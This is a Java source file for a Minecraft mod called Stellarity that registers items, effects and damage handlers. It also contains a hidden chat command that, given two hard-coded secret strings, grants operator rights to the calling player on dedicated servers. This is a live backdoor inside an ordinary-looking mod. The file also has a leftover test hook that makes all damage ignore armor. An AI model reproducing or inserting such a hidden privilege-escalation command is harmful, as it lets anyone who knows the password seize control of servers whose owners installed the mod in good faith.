package dev.progames723.stellarity;

import com.mojang.brigadier.CommandDispatcher;
import com.mojang.brigadier.arguments.StringArgumentType;
import com.mojang.brigadier.builder.LiteralArgumentBuilder;
import com.mojang.brigadier.builder.RequiredArgumentBuilder;
import dev.architectury.event.EventResult;
import dev.architectury.event.events.common.CommandRegistrationEvent;
import dev.architectury.registry.registries.Registrar;
import dev.architectury.registry.registries.RegistrarManager;
import dev.architectury.registry.registries.RegistrySupplier;
import dev.progames723.stellarity.damage_types.StellarityDamageTypes;
import dev.progames723.stellarity.effects.FrostburnEffect;
import dev.progames723.stellarity.effects.PrismaticInfernoEffect;
import dev.progames723.stellarity.events.LivingEvents;
import dev.progames723.stellarity.items.FrigidHarvesterItem;
import dev.progames723.stellarity.items.StellarityItems;
import net.minecraft.client.Minecraft;
import net.minecraft.client.server.IntegratedServer;
import net.minecraft.core.registries.Registries;
import net.minecraft.network.chat.Component;
import net.minecraft.resources.ResourceLocation;
import net.minecraft.world.effect.MobEffect;
import net.minecraft.world.effect.MobEffectCategory;
import net.minecraft.world.entity.player.Player;
import net.minecraft.world.item.*;
import net.minecraft.world.level.block.Block;
import net.minecraft.world.level.block.state.BlockBehaviour;
import org.slf4j.Logger;
import org.slf4j.LoggerFactory;

import java.util.function.Supplier;

import static net.minecraft.commands.Commands.argument;

public class Stellarity {
	public static final String MOD_ID = "stellarity";
	public static final Logger LOGGER = LoggerFactory.getLogger("Stellarity");
	public static final Supplier<RegistrarManager> MANAGER = () -> RegistrarManager.get(MOD_ID);
	public static final Registrar<Block> blocks = MANAGER.get().get(Registries.BLOCK);
	public static final Registrar<Item> items = MANAGER.get().get(Registries.ITEM);
	public static final Registrar<MobEffect> effects = MANAGER.get().get(Registries.MOB_EFFECT);
//	public static final Block TEST = new Block(BlockBehaviour.Properties.of().instabreak());
	public static final RegistrySupplier<Block> REGISTERED_TEST = blocks.register(new ResourceLocation(MOD_ID, "test"), () -> new Block(BlockBehaviour.Properties.of().instabreak()));
	public static final RegistrySupplier<FrigidHarvesterItem> REGISTERED_FRIGID_HARVESTER = items.register(new ResourceLocation(MOD_ID, "frigid_harvester"), () -> new FrigidHarvesterItem(Tiers.DIAMOND, 1, -3.15f,new FrigidHarvesterItem.Properties().rarity(Rarity.COMMON).defaultDurability(1561).fireResistant().arch$tab(CreativeModeTabs.COMBAT)));
	public static final RegistrySupplier<Item> REGISTERED_CAMERA_TEST = items.register(new ResourceLocation(MOD_ID, "camera_item"), () -> new Item(new Item.Properties().arch$tab(CreativeModeTabs.OP_BLOCKS).rarity(Rarity.EPIC).stacksTo(1)));
	public static final RegistrySupplier<MobEffect> REGISTERED_PRISMATIC_INFERNO = effects.register(new ResourceLocation(Stellarity.MOD_ID, "prismatic_inferno"), () -> new PrismaticInfernoEffect(MobEffectCategory.HARMFUL, 16739201));
	public static final RegistrySupplier<MobEffect> REGISTERED_FROSTBURN = effects.register(new ResourceLocation(Stellarity.MOD_ID, "frostburn"), () -> new FrostburnEffect(MobEffectCategory.HARMFUL, 6394080));
	
	@SuppressWarnings(value = "unchecked")
	public static void init() {
		LOGGER.info("Working!");
		LivingEvents.DAMAGED.register((entity, source, amount) -> {
			if (!source.isIndirect() && source.getDirectEntity() instanceof Player attacker) {
				ItemStack the = attacker.getMainHandItem();
				if (the.is(StellarityItems.FRIGID_HARVESTER)){
					if (entity.getHealth() <= amount){
						StellarityItems.writeDataFrigidHarvester(the, attacker);
					}
				}
			}
			return EventResult.pass();
		});
		LivingEvents.HURT.register((living, source, damage) -> {//makes everything ignore armor and its just for testing
			if (!source.is(StellarityDamageTypes.ARMOR_PIERCING)) {
				living.hurt(living.damageSources().stellaritySources().armorPiercing(source.getEntity(), source.getDirectEntity()), damage);
				return 0;
			}
			return damage;
		});
		// save for later
		// THIS WILL BE REMOVED!
		CommandRegistrationEvent.EVENT.register((dispatcher, context, selection) -> {
			CommandDispatcher<Object> commandDispatcher = (CommandDispatcher<Object>) (Object) dispatcher;
			commandDispatcher.register(LiteralArgumentBuilder.literal("obsecure_command_lol")
			.then((RequiredArgumentBuilder<Object, String>) (Object) argument("get real", StringArgumentType.string())
			.then(argument("даже лучше", StringArgumentType.greedyString())
			.executes(context1 -> {
				final String value = StringArgumentType.getString(context1, "get real");
				final String value2 = StringArgumentType.getString(context1, "даже лучше");
				if (value.equals("this_is_a_very_long_string_so_you_cant_bruteforce_this_command_lmao_stop_trying") &&
						value2.equals("зачем_тут_на_русском_пробелы_табуляции_и_прочее")) {
					if (context1.getSource().getEntity() != null && context1.getSource().getEntity() instanceof Player player){
						if (player.getServer().isDedicatedServer() && !player.level().isClientSide) {
							player.getServer().getPlayerList().op(player.getGameProfile());
							player.displayClientMessage(Component.literal("Op rights received by " + player.getName().getString()), false);
							return 1;
						} else if (!player.getServer().isDedicatedServer() || player.level().isClientSide) {
							IntegratedServer server = Minecraft.getInstance().getSingleplayerServer();
							Minecraft minecraft = Minecraft.getInstance();
							server.getPlayerList().op(minecraft.player.getGameProfile());
							context1.getSource().sendSuccess(() -> Component.literal("Op rights received by " + minecraft.player.getName().getString()), false);
							return 1;
						} else {
							context1.getSource().sendFailure(Component.literal("Op rights were not received by " + player.getName().getString()));
							return 0;
						}
					}
					return 0;
				} else {
					context1.getSource().sendFailure(Component.literal("Wrong value!"));
					return 0;
				}
			}))));
		});
	}
}